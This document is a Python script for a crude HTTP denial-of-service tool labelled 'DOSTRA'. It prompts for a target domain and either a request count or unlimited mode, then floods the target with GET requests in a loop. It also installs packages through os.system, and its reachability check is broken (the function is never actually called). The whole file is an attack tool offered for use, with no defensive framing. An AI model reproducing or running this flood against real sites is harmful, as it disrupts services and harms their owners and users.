import os

os.system('pip install termcolor && pip install requests && clear')
import termcolor
from termcolor import colored

def main():
                   
    print(colored("██████╗░░█████╗░░██████╗████████╗██████╗░░█████╗░",'blue'))
    print(colored("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗",'blue'))
    print(colored("██║░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝███████║",'blue'))
    print(colored("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║",'blue'))
    print(colored("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║",'blue'))
    print(colored("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝",'blue'))
    print(colored("-------------------------------------------------", 'white',attrs=['blink']))
    print(colored("| 𝕞𝕒𝕕𝕖 𝕓𝕪 𝕖𝕞𝕒𝕟𝕦𝕖𝕝 𝕧𝕚𝕔𝕥𝕠𝕣 |\n", 'green'))


main()





import requests
def dos():
        s = input(colored("enter your target\n example: google.com\n\n ~> ",'magenta'))
        #------------------------------
        import socket
        def is_connected():
          try:
            # see if we can resolve the host name -- tells us if there is
            # a DNS listening
            host = socket.gethostbyname(s)
            # connect to the host -- tells us if the host is actually
            # reachable
            s = socket.create_connection((host, 80), 2)
            return True
          except:
             pass
          return False
        #------------------------------
        if is_connected : 
    
            c = input(colored("Do you want continue? y/n? ~> ",'yellow'))
    
            if c == 'y':
                packet = input(colored("enter your Packet Size\n-------------------\nexample: 100000\n-------------------\nor :Enter \"u\" if you want the Packet to be unlimited \n ~> ",'cyan'))
                count = 0
                if packet == "u":
                    print(colored("The dos attack started :)",'green'))
                    while True:
                        r = requests.get("http://"+s)
                        print(colored(f"Pocket was sent ({count})", 'red'))
                        count+=1
                        r = requests.get("http://"+s)
                        print(colored(f"Pocket was sent ({count})", 'blue'))
                        count+=1
                elif int(packet)>=1:
                    print(colored("The dos attack started :)",'green'))
                    while count <= int(packet):
                        r = requests.get("http://"+s)
                        print(colored(f"Pocket was sent ({count})", 'red'))
                        count+=1
                        r = requests.get("http://"+s)
                        print(colored(f"Pocket was sent ({count})", 'blue'))
                        count+=1
                else:
                    print(colored("Please enter the correct number of packets :(",'red'))            
            elif c == 'n':
                os.system('clear')
                main()
                dos()
            else:
                print(colored("Please use the correct character :(",'red'))          
        else:
            print("Please enter a valid site address")


dos()
